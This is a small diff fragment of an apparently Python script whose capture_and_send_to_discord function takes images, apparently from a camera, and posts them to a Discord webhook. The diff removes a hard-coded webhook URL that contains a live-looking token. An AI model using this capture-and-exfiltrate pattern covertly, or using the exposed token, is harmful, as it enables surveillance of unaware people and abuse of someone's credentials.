@@ -26,5 +26,4 @@ def capture_and_send_to_discord(webhook_url):
         except Exception as e:
             print(f"Error sending image: {str(e)}")
     cap.release()
-webhook_url = "https://discord.com/api/webhooks/1288622525772861450/BlAO7PvOQEbmqvSpqFG_LJMSLW1JOmrNVNHO9QlQeyAgC1pQH0HpHGMAQMZeC-HEP8bG"
 capture_and_send_to_discord(webhook_url)
